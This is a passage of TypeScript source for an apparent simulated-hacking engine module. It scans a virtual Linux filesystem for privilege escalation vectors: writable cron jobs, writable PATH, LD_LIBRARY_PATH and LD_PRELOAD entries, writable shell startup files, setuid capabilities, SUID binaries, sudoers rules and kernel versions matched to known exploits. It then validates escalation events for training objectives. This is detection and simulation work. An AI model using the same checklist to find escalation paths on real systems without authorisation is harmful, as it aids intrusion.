            detections.push(...parseCronEntries(content, cronFile, 'root', true));
        }

        if (canUserWrite(parseModeFallback(node.mode), node.owner, user)) {
            detections.push({
                file: cronFile,
                command: cronFile,
                user: node.owner,
                mechanism: 'writable-script',
                detail: `writable cron.d entry ${cronFile}`,
            });
        }
    }

    detections.push(...parseCronDirectory(vfs, '/var/spool/cron', user));
    detections.push(...parseCronDirectory(vfs, '/var/spool/cron/crontabs', user));

    return mergeUnique(
        detections.filter(entry => entry.mechanism !== 'writable-script' || entry.file !== '/var/spool/cron'),
        (value) => `${value.file}|${value.command}|${value.user}|${value.mechanism}|${value.detail}`,
    );
}

export function findPathEscalation(vfs: VirtualFilesystem, env: Map<string, string>): readonly PathEscalation[] {
    const escalations: PathEscalation[] = [];
    const user = env.get('USER') ?? 'root';
    const seen = new Set<string>();

    for (const variable of ['PATH', 'LD_LIBRARY_PATH', 'LD_PRELOAD']) {
        const raw = env.get(variable);
        if (raw === undefined || raw.trim().length === 0) continue;

        for (const candidate of extractPathEntries(raw)) {
            if (!candidate.startsWith('/')) continue;
            const node = vfs.stat(candidate);
            if (node === null) continue;

            if (node.type === 'dir' && canUserWrite(node.mode, node.owner, user)) {
                const detail = `${variable} writable directory ${candidate}`;
                if (!seen.has(detail)) {
                    seen.add(detail);
                    escalations.push({
                        variable,
                        path: candidate,
                        reason: detail,
                    });
                }
            } else if (node.type === 'file' && canUserWrite(node.mode, node.owner, user)) {
                const detail = `${variable} writable file ${candidate}`;
                if (!seen.has(detail)) {
                    seen.add(detail);
                    escalations.push({
                        variable,
                        path: candidate,
                        reason: detail,
                    });
                }
            }
        }
    }

    const home = env.get('HOME') ?? `/home/${user}`;
    const profileCandidates = [
        `${home}/.bashrc`,
        `${home}/.profile`,
        '/root/.bashrc',
        '/root/.profile',
    ];

    for (const profile of profileCandidates) {
        const node = vfs.stat(profile);
        if (node === null || node.type !== 'file') continue;
        if (!canUserWrite(node.mode, node.owner, user)) continue;

        const key = `profile:${profile}`;
        if (seen.has(key)) continue;
        seen.add(key);
        escalations.push({
            variable: 'PERSISTENCE',
            path: profile,
            reason: `writable shell startup file ${profile}`,
        });
    }

    return escalations;
}

export function findCapabilityEscalation(vfs: VirtualFilesystem): readonly CapEscalation[] {
    const detected: CapEscalation[] = [];
    const seen = new Set<string>();

    for (const path of vfs.glob('/**')) {
        const node = vfs.stat(path);
        if (node === null || node.type !== 'file') continue;
        const lower = readTextFile(vfs, path).toLowerCase();
        if (lower.length === 0) continue;

        for (const capability of SUPPORTED_CAPABILITIES) {
            const pattern = new RegExp(`\\b${capability.replace('+', '\\+')}\\b`, 'i');
            if (!pattern.test(lower)) continue;

            const key = `${path}:${capability}`;
            if (seen.has(key)) continue;
            seen.add(key);
            detected.push({
                path,
                capability,
                evidence: `${path} includes ${capability}`,
            });
        }
    }

    return detected;
}

export function matchKernelExploits(kernelVersion: string): readonly KernelExploit[] {
    const version = parseVersion(kernelVersion);
    return KERNEL_EXPLOITS.filter(exploit =>
        exploit.affectedVersions.some(entry => matchVersionExpression(version, entry))
    );
}

function readMachineState(vfs: VirtualFilesystem, machine: string): MachineState {
    return {
        machine,
        vfs,
        suid: findSuidBinaries(vfs),
        sudoers: parseSudoers(readTextFile(vfs, '/etc/sudoers')),
        caps: findCapabilityEscalation(vfs),
    };
}

function resolveVFS(vm: VMInstance): VirtualFilesystem | null {
    const withShell = vm as VMInstance & VMWithShell;
    return withShell.shell?.getVFS() ?? null;
}

function escalationIsValid(
    state: MachineState,
    user: string,
    to: string,
    method: string,
): boolean {
    if (user === to) return false;

    if (method === 'sudo') {
        return findSudoEscalation(state.sudoers, user).some(path => path.toUser === to || path.toUser === 'root');
    }

    if (method === 'su') {
        const hasSuid = state.suid.some(s => s.binary === 'su' && s.shell);
        return user === 'root' || hasSuid || to === 'root';
    }

    const toRootPaths = findSuidBinaries(state.vfs);
    const hasShellCap = state.caps.some(cap => cap.capability === 'cap_setuid' || cap.capability === 'cap_sys_admin');
    const cronEntries = findCronEscalation(state.vfs, user);
    const pathEntries = findPathEscalation(state.vfs, envToMap(readTextFile(state.vfs, '/etc/environment')));
    const hasCronRoot = cronEntries.some(c => c.mechanism === 'root-job' && c.user === 'root');

    const canViaSuid = toRootPaths.some(v => v.shell || v.binary === 'su');
    if (to === 'root' && (hasShellCap || hasCronRoot || pathEntries.length > 0 || canViaSuid)) {
        return true;
    }

    return hasCronRoot || hasShellCap || toRootPaths.length > 0;
}

function buildChain(previous: readonly string[], from: string, to: string): string[] {
    if (previous.length === 0) {
        return [from, to];
    }
    if (previous[previous.length - 1] === from) {
        if (previous[previous.length - 1] === to) return previous.slice();
        return [...previous, to];
    }
    if (previous.includes(to)) {
        return previous.slice(0, previous.lastIndexOf(to) + 1);
    }
    return [from, to];
}

function chainChanged(a: readonly string[], b: readonly string[]): boolean {
    if (a.length !== b.length) return true;
    for (let i = 0; i < a.length; i++) {
        if (a[i] !== b[i]) return true;
    }
    return false;
}

export function createPrivescModule(eventBus?: EventBus): Module {
    const subs: Unsubscribe[] = [];
    const machineStates = new Map<string, MachineState>();
    const escalationChains = new Map<string, string[]>();
    const lastProgress = new Map<string, string>();

    const module: Module = {
        id: MODULE_ID,
        type: 'engine',
        version: MODULE_VERSION,
        description: 'Detect common Linux privilege escalation vectors and validate auth:escalate events.',

        provides: [
            { name: 'privilege-escalation' },
            { name: 'privesc' },
        ] as readonly Capability[],

        requires: [] as readonly Capability[],

        init(context: SimulationContext): void {
            machineStates.clear();
            escalationChains.clear();
            lastProgress.clear();

            const bus = eventBus ?? context.events;

            for (const [machine, vm] of context.vms) {
                const vfs = resolveVFS(vm);
                if (vfs === null) continue;
                machineStates.set(machine, readMachineState(vfs, machine));
            }

            const refresh = (_machine: string): void => {
                const vm = context.vms.get(_machine);
                if (vm === undefined) return;
                const vfs = resolveVFS(vm);
                if (vfs === null) return;
                machineStates.set(_machine, readMachineState(vfs, _machine));
            };

            subs.push(
                bus.on('auth:escalate', (event) => {
                    const state = machineStates.get(event.machine);
                    if (state === undefined) return;

                    if (!escalationIsValid(state, event.from, event.to, event.method)) {
                        return;
                    }

                    const previousChain = escalationChains.get(event.machine) ?? [];
                    const nextChain = buildChain(previousChain, event.from, event.to);
                    if (chainChanged(previousChain, nextChain)) {
                        escalationChains.set(event.machine, nextChain);
                    }

                    const summary = `${nextChain.join(' -> ')}`;
                    const lastSummary = lastProgress.get(event.machine);
                    if (lastSummary !== summary) {
                        lastProgress.set(event.machine, summary);
                        bus.emit({
                            type: 'objective:progress',
                            objectiveId: `${MODULE_ID}:${event.machine}`,
                            detail: `escalation-chain:${summary}`,
                            timestamp: Date.now(),
                        });
                    }

                    if (event.to === 'root') {
                        bus.emit({
                            type: 'objective:progress',
                            objectiveId: `${MODULE_ID}:${event.machine}:root`,
                            detail: `root-obtained:${summary}`,
                            timestamp: Date.now(),
                        });
                    }
                }),

                bus.on('fs:write', (event) => {
                    refresh(event.machine);
                }),
                bus.on('sim:tick', () => {
                    for (const machine of machineStates.keys()) {
                        refresh(machine);
                    }
                }),
            );
        },

        destroy(): void {
            for (const unsub of subs) unsub();
            subs.length = 0;
            machineStates.clear();
            escalationChains.clear();
            lastProgress.clear();
        },
    };

    return module;
}
